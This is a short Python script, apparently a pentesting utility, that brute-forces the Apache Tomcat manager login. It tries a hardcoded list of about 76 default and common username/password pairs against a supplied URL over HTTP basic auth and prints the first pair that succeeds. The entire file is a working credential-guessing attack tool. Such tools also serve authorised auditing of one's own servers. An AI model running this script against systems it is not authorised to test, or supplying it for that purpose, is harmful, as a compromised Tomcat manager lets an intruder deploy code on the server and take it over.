#!/usr/bin/env python3

import argparse
import requests


PASSWD = [
    ('tomcat', ''),
    ('admin', ''),
    ('admin', 'admin'),
    ('admin', 'tomcat'),
    ('tomcat', 'tomcat'),
    ('manager', 'manager'),
    ('tomcat', 'admin'),
    ('manager', 'admin'),
    ('tomcat', 's3cret'),
    ('root', 'root'),
    ('ADMIN', 'ADMIN'),
    ('tomcat', 'admanager'),
    ('tomcat', 'adrole1'),
    ('tomcat', 'adroot'),
    ('tomcat', 'adtomcat'),
    ('tomcat', 'advagrant'),
    ('tomcat', 'changethis'),
    ('tomcat', 'password'),
    ('tomcat', 'password1'),
    ('admin', 'admanager'),
    ('admin', 'adrole1'),
    ('admin', 'adroot'),
    ('admin', 'adtomcat'),
    ('admin', 'advagrant'),
    ('admin', 'password'),
    ('admin', 'password1'),
    ('admin', 'Password1'),
    ('admin', 'vagrant'),
    ('manager', 'admanager'),
    ('manager', 'adrole1'),
    ('manager', 'adroot'),
    ('manager', 'adtomcat'),
    ('manager', 'advagrant'),
    ('both', 'admanager'),
    ('both', 'admin'),
    ('both', 'adrole1'),
    ('both', 'adroot'),
    ('both', 'adtomcat'),
    ('both', 'advagrant'),
    ('both', 'tomcat'),
    ('demo', 'demo'),
    ('role', 'changethis'),
    ('role1', 'admanager'),
    ('role1', 'admin'),
    ('role1', 'adrole1'),
    ('role1', 'adroot'),
    ('role1', 'adtomcat'),
    ('role1', 'advagrant'),
    ('role1', 'role1'),
    ('role1', 'tomcat'),
    ('root', 'admanager'),
    ('root', 'admin'),
    ('root', 'adrole1'),
    ('root', 'adroot'),
    ('root', 'adtomcat'),
    ('root', 'advagrant'),
    ('root', 'changethis'),
    ('root', 'password'),
    ('root', 'password1'),
    ('root', 'Password1'),
    ('root', 'r00t'),
    ('root', 'toor'),
    ('tomcat', 'ads3cret'),
    ('admin', 'ads3cret'),
    ('manager', 'ads3cret'),
    ('both', 'ads3cret'),
    ('role1', 'ads3cret'),
    ('root', 'ads3cret'),
    ('ovwebusr', 'OvW*busr1'),
    ('server_admin', 'owaspbwa'),
    ('admin', 'owaspbwa'),
    ('root', 'owaspbwa'),
    ('xampp', 'xampp'),
    ('cxsdk', 'kdsxc'),
    ('j2deployer', 'j2deployer'),
    ('QCC', 'QLogic66'),
]


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description='Apache Tomcat bruteforce utility',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('-u', '--url', help='E.g. "http://localhost:8080/manager/html"', required=True)
    args = parser.parse_args()
    print(f'Checking {args.url}...')
    for cred in PASSWD:
        req = requests.get(args.url, auth=cred)
        if req.status_code == 200:
            print(f'Worked: {cred[0]}:{cred[1]}')
            break
        else:
            print(f'Failed: {cred[0]}:{cred[1]}')
